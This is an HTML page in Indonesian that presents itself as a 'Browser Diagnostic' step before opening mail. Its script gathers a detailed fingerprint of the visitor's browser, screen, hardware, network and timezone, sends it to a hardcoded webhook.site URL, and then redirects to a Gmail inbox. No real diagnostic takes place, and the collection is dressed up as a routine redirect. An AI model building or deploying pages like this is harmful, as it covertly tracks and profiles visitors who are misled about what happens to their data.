<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Browser Diagnostic Redirect</title>

<style>
body{
    margin:0;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#202124;
    font-family:Arial,sans-serif;
}

.card{
    width:90%;
    max-width:420px;
    background:#fff;
    padding:35px;
    border-radius:18px;
    text-align:center;
    box-shadow:0 10px 30px rgba(0,0,0,.35);
}

button{
    width:100%;
    padding:15px;
    border:0;
    border-radius:10px;
    background:#0066ff;
    color:white;
    font-size:17px;
    cursor:pointer;
}

button:disabled{
    background:#888;
}

#status{
    margin-top:20px;
    font-size:14px;
}
</style>

</head>

<body>

<div class="card">

<h2>Continue</h2>

<p>Browser Diagnostic</p>

<button id="send">
Kirim & Buka Mail
</button>

<div id="status">
Siap
</div>

</div>


<script>

const WEBHOOK =
"https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";


function collectData(){

const n = navigator;

const conn =
n.connection ||
n.webkitConnection ||
n.mozConnection;


return {

event:"browser_diagnostic",

timestamp:new Date().toISOString(),

page:{
    url:location.href,
    title:document.title,
    referrer:document.referrer || ""
},

browser:{
    userAgent:n.userAgent,
    language:n.language,
    languages:n.languages,
    platform:n.platform,
    vendor:n.vendor,
    online:n.onLine,
    cookieEnabled:n.cookieEnabled
},

screen:{
    width:screen.width,
    height:screen.height,
    availableWidth:screen.availWidth,
    availableHeight:screen.availHeight,
    colorDepth:screen.colorDepth,
    pixelRatio:window.devicePixelRatio
},

window:{
    width:innerWidth,
    height:innerHeight
},

device:{
    cpu:n.hardwareConcurrency || null,
    memory:n.deviceMemory || null,
    touch:n.maxTouchPoints > 0,
    touchPoints:n.maxTouchPoints || 0
},

network:conn ? {
    type:conn.effectiveType || null,
    downlink:conn.downlink || null,
    rtt:conn.rtt || null
}:null,

time:{
    timezone:Intl.DateTimeFormat()
    .resolvedOptions()
    .timeZone,

    local:new Date().toString()
}

};

}



document.getElementById("send")
.onclick = async function(){

this.disabled=true;

const status =
document.getElementById("status");

status.innerHTML="Mengirim...";


const data = collectData();


const params = new URLSearchParams();


Object.keys(data).forEach(key=>{

params.append(
key,
typeof data[key] === "object"
? JSON.stringify(data[key])
: data[key]
);

});


try{

await fetch(
WEBHOOK+"?"+params.toString(),
{
method:"GET",
mode:"no-cors"
}
);


status.innerHTML=
"Berhasil. Membuka mail.com...";


}catch(e){

status.innerHTML=
"Redirect...";

}


setTimeout(()=>{

window.location.href=
"https://mail.google.com/mail/u/0/#inbox";

},1000);


};

</script>

</body>
</html>
